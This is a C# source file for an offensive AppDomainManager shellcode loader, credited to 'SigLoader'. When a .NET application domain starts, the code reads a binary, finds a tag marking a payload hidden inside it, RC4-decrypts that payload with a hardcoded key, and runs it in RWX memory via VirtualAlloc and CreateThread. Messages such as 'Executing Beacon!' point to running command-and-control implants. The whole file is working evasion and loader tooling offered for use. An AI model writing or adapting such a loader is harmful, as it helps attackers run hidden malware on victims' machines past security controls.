# Credits to med0x2e for SigLoader
# Appdomain + Shellcode Loader
# TODO: replace createthread with other injection techique

using System;
using System.IO;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


public sealed class Z45UDG : AppDomainManager
{
  
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		System.Windows.Forms.MessageBox.Show("Initialize");
	
		bool res = ClassExample.Execute();
		
        return;
    }
}

public class ClassExample 
{         
	//private static UInt32 MEM_COMMIT = 0x1000;          
	//private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
	
	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(            
	UInt32 lpThreadAttributes,
	UInt32 dwStackSize,
	IntPtr lpStartAddress,
	IntPtr param,
	UInt32 dwCreationFlags,
	ref UInt32 lpThreadId           
	);
	   
[DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
 public static byte[] Read(string filePath)
        {
            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] rawData = new byte[stream.Length];
                stream.Read(rawData, 0, (int)stream.Length);
                stream.Close();

                return rawData;
            }
        }


  public static byte[] Decrypt(byte[] data, string encKey)
        {
            byte[] T = new byte[256];
            byte[] S = new byte[256];
            int keyLen = encKey.Length;
            int dataLen = data.Length;
            byte[] result = new byte[dataLen];
            byte tmp;
            int j = 0, t = 0, i = 0;


            for (i = 0; i < 256; i++)
            {
                S[i] = Convert.ToByte(i);
                T[i] = Convert.ToByte(encKey[i % keyLen]);
            }

            for (i = 0; i < 256; i++)
            {
                j = (j + S[i] + T[i]) % 256;
                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;
            }
            j = 0;
            for (int x = 0; x < dataLen; x++)
            {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;

                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;

                t = (S[i] + S[j]) % 256;

                result[x] = Convert.ToByte(data[x] ^ S[t]);
            }

            return result;
        }

 public static int scanPattern(byte[] _peBytes, byte[] pattern)
        {
            int _max = _peBytes.Length - pattern.Length + 1;
            int j;
            for (int i = 0; i < _max; i++) {
                if (_peBytes[i] != pattern[0]) continue;
                for (j = pattern.Length - 1; j >= 1 && _peBytes[i + j] == pattern[j]; j--) ;
                if (j == 0) return i;
            }
            return -1;
        }


      public static void ExecShellcode(byte[] shellcode)
        {
            uint threadId;

            IntPtr alloc = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000 | 0x2000, 0x40);
            if (alloc == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

    public static void WriteFile(string filename, byte[] rawData)
        {
            FileStream fs = new FileStream(filename, FileMode.OpenOrCreate);
            fs.Write(rawData, 0, rawData.Length);
            fs.Close();
        }

	public static bool Execute()
	{
	  System.Windows.Forms.MessageBox.Show("Executing Beacon!");
	
	// This should be your binary you wanna inject into . 
	  byte[] _peBlob = Read("Z:\\zloader\\update.exe");

	  int _dataOffset = scanPattern(_peBlob, _tag);

	   Stream stream = new MemoryStream(_peBlob);
       long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);

byte[] shellcode = new byte[_peBlob.Length+2 - (pos + _tag.Length)];

// debug line
string result = System.Text.Encoding.UTF8.GetString(shellcode);
// debug line - log decrypted shellcode 
WriteFile("Z:\\zloader\\log.txt", shellcode);

stream.Read(shellcode, 0, (_peBlob.Length+2) - ((int)pos + _tag.Length));

// Replace the below hardcoded with password of your choice
 byte[] _data = Decrypt(shellcode, "S3cretK3y");

WriteFile("Z:\\zloader\\log.txt", _data);
	
 stream.Close();

// Execute the decrypted Shellcode 
   ExecShellcode(_data);


	  return true;
	} 
}
